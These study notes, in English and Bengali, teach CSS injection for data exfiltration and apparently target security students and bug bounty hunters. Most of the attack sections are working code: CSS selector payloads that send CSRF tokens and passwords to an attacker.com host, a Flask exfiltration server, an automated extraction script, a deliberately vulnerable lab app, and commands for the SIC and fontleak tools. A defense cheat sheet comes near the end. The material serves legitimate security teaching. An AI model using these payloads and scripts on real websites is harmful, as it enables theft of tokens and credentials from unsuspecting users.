# 🎨 CSS Injection — Detailed Study Notes

> **Also Known As:** CSS Exfiltration, Blind CSS Attack
> **Audience:** Cybersecurity students, ethical hackers, bug bounty hunters
> **Disclaimer:** শুধুমাত্র authorized system এবং lab environment এ practice করো।

---

## 📚 Table of Contents

1. [Concept — CSS Injection কী?](#1-concept--css-injection-কী)
2. [কেন CSS দিয়ে Data Steal করা যায়?](#2-কেন-css-দিয়ে-data-steal-করা-যায়)
3. [Technique 1 — CSS Attribute Selectors](#3-technique-1--css-attribute-selectors)
4. [Technique 2 — CSS @import (Blind Exfiltration)](#4-technique-2--css-import-blind-exfiltration)
5. [Technique 3 — Sequential Import Chaining (SIC)](#5-technique-3--sequential-import-chaining-sic)
6. [Technique 4 — CSS Font-face Unicode Range](#6-technique-4--css-font-face-unicode-range)
7. [Technique 5 — attr() Function Abuse](#7-technique-5--attr-function-abuse)
8. [Technique 6 — Ligature Font Attack](#8-technique-6--ligature-font-attack)
9. [Technique 7 — CSS Conditionals (Modern)](#9-technique-7--css-conditionals-modern)
10. [Tools Overview](#10-tools-overview)
11. [Practical Lab Setup](#11-practical-lab-setup)
12. [Testing Methodology](#12-testing-methodology)
13. [Defense Cheat Sheet](#13-defense-cheat-sheet)
14. [References](#14-references)

---

## 1. Concept — CSS Injection কী?

### Core Idea

```
CSS Injection হলো যখন attacker untrusted CSS inject করতে পারে
একটা web page এ।

JavaScript injection = XSS (well-known, heavily filtered)
CSS injection = Less known, often ALLOWED by CSP!

CSS দিয়ে কী করা যায়:
  ✅ CSRF token চুরি করা
  ✅ Hidden input values leak করা
  ✅ Sensitive text/attribute extract করা
  ✅ OAuth tokens steal করা
  ✅ Page layout manipulate করা
  ✅ Timing attacks
```

```
কেন CSS Injection আলাদা এবং dangerous:

XSS:
  CSP: script-src 'self'  → JavaScript blocked!
  Attacker needs JS bypass

CSS Injection:
  CSP: style-src 'unsafe-inline'  ← Often allowed!
  CSS নিজেই HTTP requests করতে পারে!
  → JS ছাড়াই data exfiltrate!
```

### Where CSS Injection Happens

```
কোথায় CSS inject করা যায়:
  ✅ Style attribute: <div style="USER_INPUT">
  ✅ <style> tag এর ভেতরে (যদি user content allowed)
  ✅ CSS file এ user-controlled content
  ✅ color/theme selector features
  ✅ Custom CSS fields in CMS
  ✅ HTML email templates
  ✅ Markdown renderers that allow some HTML
```

---

## 2. কেন CSS দিয়ে Data Steal করা যায়?

### CSS এর Network Request Capability

```css
/* CSS properties যেগুলো network request করে: */

/* 1. background-image: */
div {
  background-image: url(https://attacker.com/log);
}
/* → Browser fetches this URL! */

/* 2. @font-face: */
@font-face {
  font-family: 'test';
  src: url(https://attacker.com/font);
}

/* 3. @import: */
@import url(https://attacker.com/next.css);

/* 4. border-image: */
div {
  border-image: url(https://attacker.com/log);
}

/* 5. list-style-image: */
li {
  list-style-image: url(https://attacker.com/log);
}
```

### The Key Insight

```
CSS attribute selectors + network requests = DATA EXFILTRATION!

Logic:
  IF element matches selector → background-image URL fetch হয়

  Selector: input[value^="a"]  → value "abc..." এর input select করে
  CSS:      background: url(https://attacker.com/?c=a)

  Browser:
    Input এর value "abc" দিয়ে শুরু? YES → fetch url → attacker sees "?c=a"
    Input এর value "abc" দিয়ে শুরু? NO  → no fetch

  Attacker:
    ?c=a request পেলাম → first char = 'a'!
    এখন next char guess করো!
```

---

## 3. Technique 1 — CSS Attribute Selectors

### Selector Types

```css
/* Prefix selector — value শুরু হয় "TOKEN_012" দিয়ে */
input[value^='TOKEN_012'] {
  background-image: url(http://attacker.com/?prefix=TOKEN_012);
}

/* Suffix selector — value শেষ হয় "xyz" দিয়ে */
input[value$='xyz'] {
  background-image: url(http://attacker.com/?suffix=xyz);
}

/* Substring selector — value তে "abc" আছে */
input[value*='abc'] {
  background-image: url(http://attacker.com/?contains=abc);
}

/* Exact match */
input[name='pin'][value='1234'] {
  background: url(https://attacker.com/log?pin=1234);
}
```

### Character-by-Character Extraction

```
CSRF Token: "abc123xyz" (length 9)

Step 1: Inject CSS with all possible first characters:
  input[value^="a"] { background: url(https://attacker.com/?c=a); }
  input[value^="b"] { background: url(https://attacker.com/?c=b); }
  input[value^="c"] { background: url(https://attacker.com/?c=c); }
  ...
  input[value^="z"] { background: url(https://attacker.com/?c=z); }
  input[value^="0"] { background: url(https://attacker.com/?c=0); }
  ...

Attacker server receives: GET /?c=a
→ First character = 'a' ✅

Step 2: Now guess second character:
  input[value^="aa"] { background: url(?c=aa); }
  input[value^="ab"] { background: url(?c=ab); }
  input[value^="ac"] { background: url(?c=ac); }
  ...

Attacker receives: GET /?c=ab
→ First two chars = 'ab' ✅

Continue until full token extracted!
```

### Full CSS Payload Example

```css
/* Inject this CSS to extract CSRF token character by character */

/* All 62 characters (a-z, A-Z, 0-9) */
input[name='csrf'][value^='a'] {
  background: url(//attacker.com/a);
}
input[name='csrf'][value^='b'] {
  background: url(//attacker.com/b);
}
input[name='csrf'][value^='c'] {
  background: url(//attacker.com/c);
}
/* ... d through z ... */
input[name='csrf'][value^='A'] {
  background: url(//attacker.com/A);
}
/* ... B through Z ... */
input[name='csrf'][value^='0'] {
  background: url(//attacker.com/0);
}
/* ... 1 through 9 ... */
```

### Hidden Input Trick (Sibling Selector)

```css
/* Problem: hidden input এ background-image কাজ করে না
   (display:none হলে render হয় না → no image fetch)

Solution: Next sibling এ style দাও! */

/* hidden input এর পরের visible element কে style করো: */
input[name='csrf-token'][value^='a'] + input {
  background: url(https://attacker.com/?q=a);
}
/* → csrf-token এর value "a" দিয়ে শুরু হলে
      পরের input element এ background set হয় → URL fetch! */

/* অথবা :has() pseudo-class: */
div:has(input[value='secret']) {
  background: url(https://attacker.com/?val=secret);
}
/* → parent div এর মধ্যে যদি ওই input থাকে → fetch! */
```

### Speed Up with Prefix + Suffix Simultaneously

```css
/* দুটো property দিয়ে একসাথে prefix AND suffix extract করো: */

/* Prefix check via background */
input[value^='ab'] {
  background: url(https://attacker.com/prefix?v=ab);
}

/* Suffix check via list-style-image */
input[value$='xy'] {
  list-style-image: url(https://attacker.com/suffix?v=xy);
}

/* দুটো parallelly check করলে faster extraction! */
```

---

## 4. Technique 2 — CSS @import (Blind Exfiltration)

### Concept

```html
<!-- @import দিয়ে attacker এর server থেকে CSS load হয়: -->
<style>
  @import url(http://attacker.com/staging?len=32);
</style>
<style>
  @import '//attacker.com/css';
</style>
```

```
How it works:
  1. Browser imports CSS from attacker's server
  2. Attacker's server can:
     - Long-poll (connection hold করো)
     - Character extraction complete হলে next CSS response দাও
  3. New CSS → new selectors → next character found
  4. চেইন চলতে থাকে!

Advantage:
  Page reload লাগে না!
  @import দিয়ে dynamic CSS loading possible
```

### @import Chain Server

```python
# attacker_server.py — simple CSS injection server
from flask import Flask, Response, request
import time

app = Flask(__name__)

known_prefix = ""  # extracted so far
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

@app.route('/staging')
def staging():
    """Initial import — generates character-guessing CSS"""
    length = request.args.get('len', 32)

    # Generate CSS for next character:
    css = generate_selector_css(known_prefix)
    return Response(css, content_type='text/css')

@app.route('/collect')
def collect():
    """Called when a character is found"""
    global known_prefix
    found_char = request.args.get('c', '')
    known_prefix += found_char
    print(f"[+] Found character: {found_char}")
    print(f"[+] Token so far: {known_prefix}")
    return Response("", status=204)

def generate_selector_css(prefix):
    css_rules = []
    for char in CHARSET:
        css_rules.append(
            f'input[name="csrf"][value^="{prefix}{char}"]'
            f'{{background:url(//attacker.com/collect?c={char})}}'
        )
    return '\n'.join(css_rules)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

---

## 5. Technique 3 — Sequential Import Chaining (SIC)

### Concept

```
SIC = Sequential Import Chaining

Problem with basic @import:
  CSS loaded → character extracted → need to update CSS
  But CSS already loaded → can't change!

SIC solution:
  Each @import → server holds connection open (long-poll)
  → Character found → server sends response (next @import)
  → Next @import immediately chains to next step!
  → Page reload = 0!

Flow:
  Browser → @import /step1
  Server: hold connection...
  CSS selector matches → background: url(/found?c=a)
  Server detects /found → generates step2 CSS
  Server sends step2 CSS as response to /step1
  Browser → @import /step2 (new import in step2 CSS)
  Repeat!
```

```bash
# SIC tool:
git clone https://github.com/d0nutptr/sic
cd sic
python3 sic.py --target-url "https://target.com/page" \
               --css-selector "input[name='csrf']" \
               --exfil-url "https://attacker.com"
```

---

## 6. Technique 4 — CSS Font-face Unicode Range

### Concept

```
@font-face + unicode-range = character existence oracle!

Logic:
  Font defined for specific Unicode character
  If that character appears in target text → font loaded → URL fetched!
  If character absent → no URL fetch
```

```html
<style>
  /* Character 'A' (U+0041) এর জন্য custom font: */
  @font-face {
    font-family: poc;
    src: url(http://attacker.com/?char=A); /* request যাবে যদি 'A' থাকে */
    unicode-range: U+0041;
  }

  /* Character 'B' (U+0042) এর জন্য: */
  @font-face {
    font-family: poc;
    src: url(http://attacker.com/?char=B); /* request যাবে যদি 'B' থাকে */
    unicode-range: U+0042;
  }

  /* Character 'C' (U+0043) এর জন্য: */
  @font-face {
    font-family: poc;
    src: url(http://attacker.com/?char=C); /* নেই → request যাবে না */
    unicode-range: U+0043;
  }

  /* Target element এ এই font apply করো: */
  #sensitive-information {
    font-family: poc;
  }
</style>

<!-- Target element: -->
<p id="sensitive-information">AB</p>
<!-- Text "AB" আছে:
     A request → fetched ✅
     B request → fetched ✅
     C request → NOT fetched ❌ (C নেই)
     Attacker: AB letters are present! -->
```

### Unicode Ranges for Common Characters

```css
/* Common character ranges: */
@font-face {
  font-family: leak;
  src: url(https://attacker.com/?c=a);
  unicode-range: U+0061; /* 'a' */
}
@font-face {
  font-family: leak;
  src: url(https://attacker.com/?c=b);
  unicode-range: U+0062; /* 'b' */
}
/* ... continue for all needed characters ... */

/* Quick reference:
  U+0030-0039 = 0-9
  U+0041-005A = A-Z
  U+0061-007A = a-z
  U+0020      = space */
```

### Limitations

```
Font-face technique limitations:
  ❌ Duplicate detection নেই: "AA" → same as "A" (one request)
  ❌ Character ORDER জানা যায় না
  ✅ Character EXISTENCE জানা যায়
  ✅ Very reliable (browser behavior consistent)

Chrome: Marked as "WontFix" → এখনো works!
```

---

## 7. Technique 5 — attr() Function Abuse

### Concept

```
CSS attr() function → element এর attribute value পড়তে পারে

New in modern browsers:
  attr() দিয়ে value পড়ে → image-set() এ pass করো
  → Browser URL হিসেবে interpret করে → fetch করে!
```

### Example — Password Field Exfiltration

**Target page (victim এর browser এ):**

```html
<html>
  <head>
    <!-- Attacker এর CSS file load হচ্ছে! -->
    <link rel="stylesheet" href="http://attacker.local/index.css" />
  </head>
  <body>
    <input type="text" name="password" value="supersecret" />
  </body>
</html>
```

**Attacker এর index.css:**

```css
input[name='password'] {
  background: image-set(attr(value));
}
```

```
What happens:
  1. Browser loads attacker's CSS
  2. CSS selects password input
  3. attr(value) = "supersecret"
  4. image-set("supersecret") → browser tries to fetch as URL!
  5. Since CSS is cross-origin, URL resolved against attacker's origin:
     http://attacker.local/supersecret
  6. Attacker server log:
     GET /supersecret HTTP/1.1 → PASSWORD LEAKED!
```

```
Attacker server log:
  10.10.10.10 - - [15/Feb/2026 16:33:21] "GET /supersecret HTTP/1.1" 404 -
  ↑ password "supersecret" attacker এর server এ পৌঁছে গেলো!
```

---

## 8. Technique 6 — Ligature Font Attack

### Concept

```
Ligature = একাধিক character → একটা glyph (combined shape)
  Common ligatures: fi, fl, ffi, ffl (typographic ligatures)

Attack:
  Custom font তৈরি করো যেখানে target string এর ligature = HUGE width!

  If target text contains "secret_token" →
  Ligature renders → element becomes very wide →
  Scrollbar appears! (অথবা media query triggers)

  CSS media query বা scrollbar detect করো →
  Attacker server এ request পাঠাও!
```

### Fontleak Tool

```bash
# fontleak Docker দিয়ে চালাও:
docker run -it --rm -p 4242:4242 \
  -e BASE_URL=http://localhost:4242 \
  ghcr.io/adrgs/fontleak:latest

# Payload inject করো victim page এ:
<style>
  @import url("http://localhost:4242/?selector=.secret&parent=head&alphabet=abcdef0123456789");
</style>
```

```
Parameters:
  selector: CSS selector for target element (.secret, #csrf, input[name='token'])
  parent: Where to inject (head, body)
  alphabet: Which characters to try

Output:
  fontleak server extracts the text content of the target element!
```

---

## 9. Technique 7 — CSS Conditionals (Modern — 2025)

### Concept

```
CSS if() function (very new feature) দিয়ে inline style এ logic:
  বিভিন্ন attribute values check করো → different URLs fetch করো
```

```html
<!-- Inline style exfiltration with CSS conditionals: -->
<div
  style='
  --val: attr(data-uid);
  --steal: if(
    style(--val: "1"): url(/1);
    else: if(
      style(--val: "2"): url(/2);
      else: if(
        style(--val: "3"): url(/3);
        else: if(
          style(--val: "4"): url(/4);
          else: url(/unknown)
        )
      )
    )
  );
  background: image-set(var(--steal));
'
  data-uid="3"
></div>
<!-- data-uid="3" → --val="3" → style(--val:"3") matches → url(/3) fetched!
     Attacker: GET /3 → data-uid = 3! -->
```

---

## 10. Tools Overview

| Tool                       | কী করে                         | কখন ব্যবহার            |
| -------------------------- | ------------------------------ | ---------------------- |
| **blind-css-exfiltration** | Blind CSS injection automation | Unknown page structure |
| **css-scrollbar-attack**   | Scrollbar দিয়ে text leak      | Text content extract   |
| **sic**                    | Sequential Import Chaining     | No-reload exfiltration |
| **fontleak**               | Ligature font attack           | Full string extraction |
| **css-exfiltration**       | Collection of techniques       | Learning/research      |

```bash
# Tool quick reference:

# 1. blind-css-exfiltration (Gareth Heyes):
# → PortSwigger Research tool
# GitHub: hackvertor/blind-css-exfiltration

# 2. fontleak (fastest string extraction):
docker run -it --rm -p 4242:4242 \
  -e BASE_URL=http://attacker.com \
  ghcr.io/adrgs/fontleak:latest

# 3. sic (no page reload):
python3 sic.py --target "https://target.com" --selector "input[name='csrf']"

# 4. css-scrollbar-attack:
# Text nodes leak via scrollbar width detection
```

---

## 11. Practical Lab Setup

### Lab 1: Basic CSS Exfiltration

```bash
mkdir css-injection-lab && cd css-injection-lab

# Victim server (has CSS injection vulnerability):
cat > victim.py << 'EOF'
from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route('/')
def index():
    user_color = request.args.get('color', 'blue')
    # ❌ VULNERABLE: user color directly in CSS!
    template = f"""
    <html>
    <head>
    <style>
        body {{ color: {user_color}; }}  /* CSS injection here! */
    </style>
    </head>
    <body>
        <form>
            <input type="hidden" name="csrf_token" value="SECRET_TOKEN_XYZ789">
            <input type="text" name="username" placeholder="Username">
            <button>Submit</button>
        </form>
        <p>Welcome to the site!</p>
    </body>
    </html>
    """
    return template

if __name__ == '__main__':
    app.run(port=5000, debug=True)
EOF

# Attacker server (receives leaked data):
cat > attacker.py << 'EOF'
from flask import Flask, request
app = Flask(__name__)

found_chars = {}

@app.route('/')
def collect():
    char = request.args.get('c', '')
    pos = request.args.get('p', '0')
    print(f"[+] Position {pos}: '{char}'")
    found_chars[int(pos)] = char

    # Print what we know so far:
    token = ''.join(found_chars.get(i, '?') for i in range(max(found_chars.keys(), default=0)+1))
    print(f"[+] Token so far: {token}")

    return '', 204

if __name__ == '__main__':
    app.run(port=8080, debug=True)
EOF

# Terminal 1:
python3 victim.py

# Terminal 2:
python3 attacker.py
```

```bash
# Attack!
# CSS payload inject করো victim এ:
# URL: http://localhost:5000/?color=red}input[name="csrf_token"][value^="S"]{background:url(http://localhost:8080/?c=S&p=0)/*

# Full payload (all characters for first position):
PAYLOAD=$(cat << 'PAYLOAD'
red}
input[name="csrf_token"][value^="S"]{background:url(http://localhost:8080/?c=S&p=0)}
input[name="csrf_token"][value^="E"]{background:url(http://localhost:8080/?c=E&p=0)}
body{color:
PAYLOAD
)

# URL encode and inject:
curl "http://localhost:5000/?color=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")"
```

### Lab 2: Automated Extraction Script

```python
#!/usr/bin/env python3
# css_injector.py — Automated CSS token extraction

import requests
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# Shared state:
found_chars = {}
extraction_complete = False

class AttackerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        if 'c' in params:
            char = params['c'][0]
            pos = int(params.get('p', ['0'])[0])
            found_chars[pos] = char

            token = ''.join(found_chars.get(i, '?')
                          for i in range(max(found_chars.keys(), default=0)+1))
            print(f"\r[+] Token: {token}", end='', flush=True)

        self.send_response(204)
        self.end_headers()

    def log_message(self, format, *args):
        pass  # Suppress default logging

def start_attacker_server(port=8080):
    server = HTTPServer(('0.0.0.0', port), AttackerHandler)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()
    print(f"[*] Attacker server started on :{port}")

def generate_css_payload(prefix, attacker_url, selector='input[name="csrf_token"]'):
    """Generate CSS to extract next character after known prefix"""
    CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'
    pos = len(prefix)

    rules = []
    for char in CHARSET:
        rule = (f'{selector}[value^="{prefix}{char}"]'
                f'{{background:url({attacker_url}?c={char}&p={pos})}}')
        rules.append(rule)

    return '\n'.join(rules)

def inject_css(victim_url, css_payload):
    """Inject CSS into victim page (example with color parameter)"""
    # Payload wraps the CSS injection:
    injection = f'red}}{css_payload}body{{color:'

    try:
        response = requests.get(victim_url, params={'color': injection}, timeout=5)
        return response.status_code == 200
    except:
        return False

# Run:
start_attacker_server(8080)

victim_url = "http://localhost:5000/"
attacker_url = "http://localhost:8080/"
extracted = ""

print("[*] Starting CSS injection extraction...")
for i in range(32):  # Extract up to 32 chars
    time.sleep(0.5)
    css = generate_css_payload(extracted, attacker_url)
    inject_css(victim_url, css)

    time.sleep(1)  # Wait for browser to load

    if len(extracted) < len(found_chars) + 1:
        extracted = ''.join(found_chars.get(j, '') for j in sorted(found_chars.keys()))

print(f"\n[✓] Extracted token: {extracted}")
```

---

## 12. Testing Methodology

### Step 1: Find CSS Injection Point

```bash
# Test করো যেকোনো user-controlled CSS value:

# Color picker:
GET /profile?theme=red → <style>body{color:red;}</style>
GET /profile?theme=red}* → Does it break CSS? → injectable!

# Custom CSS fields:
POST /settings
custom_css: body{background:red}

# Style attribute:
GET /page?bgcolor=red → <div style="background:red">
GET /page?bgcolor=red;malicious → injectable?
```

### Step 2: Confirm Injection

```css
/* Test: does this cause a network request? */
red; background: url(https://your-server.com/test)
```

```bash
# Burp Collaborator বা interactsh ব্যবহার করো:
red; background: url(https://YOUR_BURP_COLLABORATOR.oastify.com/test)

# যদি Collaborator এ DNS/HTTP interaction দেখা যায় → CSS injection confirmed!
```

### Step 3: Identify Target Data

```
কী steal করতে চাই?
  ✅ CSRF token: input[name="csrf_token"]
  ✅ Hidden values: input[type="hidden"]
  ✅ Data attributes: [data-uid], [data-token]
  ✅ Text content: needs font-face or ligature technique
  ✅ href values: a[href^="..."]
```

### Step 4: Choose Technique

```
Decision tree:

Attribute value (e.g., CSRF token) →
  → Visible input: CSS Selector + background-image
  → Hidden input: Sibling selector trick

Text content →
  → Known position: Font-face unicode range
  → Full string: Ligature (fontleak)

No reload possible →
  → @import + Sequential Import Chaining (SIC)

Modern browser with attr() support →
  → attr() + image-set() technique
```

### Step 5: Build and Test Payload

```python
# Quick payload generator:
def generate_payload(prefix, attacker_host, selector, pos):
    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    rules = []
    for c in charset:
        rules.append(
            f'{selector}[value^="{prefix}{c}"]'
            f'{{background:url(https://{attacker_host}/?c={c}&p={pos})}}'
        )
    return '\n'.join(rules)
```

---

## 13. Defense Cheat Sheet

### ✅ Fix 1: Content Security Policy (CSP)

```html
<!-- Strict CSP — no external CSS, no inline styles: -->
<meta
  http-equiv="Content-Security-Policy"
  content="
        style-src 'self';
        img-src 'self';
        font-src 'self';
        connect-src 'self';
      "
/>
```

```
CSP এ কী block করবে:
  style-src 'self'    → External CSS import blocked
  img-src 'self'      → background-image URL blocked
  font-src 'self'     → @font-face external URL blocked

⚠️ unsafe-inline avoid করো! CSS injection এর root cause।
```

### ✅ Fix 2: Sanitize CSS Input

```python
# Python — CSS sanitization:
import re

def sanitize_css_value(value):
    # Remove special characters:
    # } closes existing rule
    # { starts new rule
    # @ starts at-rules (@import, @font-face)
    # ; ends properties
    # url() function call

    dangerous_patterns = [
        r'\}',           # Close brace
        r'\{',           # Open brace
        r'@',            # At-rules
        r'url\s*\(',     # url() function
        r'import',       # @import keyword
        r'expression',   # IE expression()
        r'javascript',   # javascript: URLs
    ]

    for pattern in dangerous_patterns:
        if re.search(pattern, value, re.IGNORECASE):
            raise ValueError(f"Dangerous CSS content: {value}")

    return value

# Use:
try:
    safe_color = sanitize_css_value(user_color)
except ValueError:
    safe_color = 'blue'  # Default safe value
```

### ✅ Fix 3: Allowlist CSS Values

```python
# Most specific fix — only allow predefined values:
ALLOWED_COLORS = {'red', 'blue', 'green', 'yellow', 'black', 'white', 'purple'}
ALLOWED_THEMES = {'dark', 'light', 'contrast'}

def get_safe_color(user_input):
    if user_input in ALLOWED_COLORS:
        return user_input
    return 'blue'  # Default

def get_safe_theme(user_input):
    if user_input in ALLOWED_THEMES:
        return user_input
    return 'light'
```

### ✅ Fix 4: CSRF Token Protection (CSS Injection এর Main Target)

```
CSS injection এর primary goal = steal CSRF token!

Defense:
  → HttpOnly cookie এ CSRF token রাখো (CSS can't read cookies!)
  → CSRF token কে hidden input এ না রেখে
    custom header হিসেবে পাঠাও
  → Double submit cookie pattern use করো
```

### Defense Summary

```
Attack                          → Fix
────────────────────────────────────────────────────────────────────────
CSS value injection             → Strict allowlist validation
                                  Never put user input directly in CSS

External CSS loading            → CSP: style-src 'self'
                                  No @import from external

background-image exfiltration   → CSP: img-src 'self'
                                  Block external image loads

@font-face exfiltration         → CSP: font-src 'self'
                                  Block external font loads

CSRF token via CSS              → Store in HttpOnly cookie
                                  Use custom headers instead of hidden inputs

unsafe-inline CSS               → Remove unsafe-inline from CSP
                                  Use nonces or hashes instead
```

---

## 14. References

| Resource                             | Link                                                                                        |
| ------------------------------------ | ------------------------------------------------------------------------------------------- |
| PayloadsAllTheThings                 | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSS%20Injection)   |
| Blind CSS Exfiltration — PortSwigger | [Research](https://portswigger.net/research/blind-css-exfiltration)                         |
| fontleak Tool                        | [GitHub](https://github.com/adrgs/fontleak)                                                 |
| Sequential Import Chaining           | [GitHub: d0nutptr/sic](https://github.com/d0nutptr/sic)                                     |
| CSS Scrollbar Attack                 | [GitHub](https://github.com/cgvwzq/css-scrollbar-attack)                                    |
| Font-face Unicode Range Attack       | [Masato Kinugawa](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html) |
| Inline Style Exfiltration            | [PortSwigger Research](https://portswigger.net/research/inline-style-exfiltration)          |
| xsleaks.dev CSS Injection            | [xsleaks.dev](https://xsleaks.dev/docs/attacks/css-injection/)                              |
| Fontleak Blog                        | [Dragos Albastroiu](https://adragos.ro/fontleak/)                                           |

---

> ✅ **Next Topic Suggestions:**
>
> - `XSS Injection/README.md` — XSS + CSS Injection combination attack
> - `Cross-Site Request Forgery/README.md` — CSRF token এর defense (CSS steals it)
> - `CORS Misconfiguration/README.md` — Cross-origin related
> - `Content Security Policy bypass` — CSP bypass techniques

> ⚠️ **Ethical Reminder:** CSS injection testing শুধুমাত্র authorized pentest, Bug Bounty scope, বা নিজের lab এ করো।
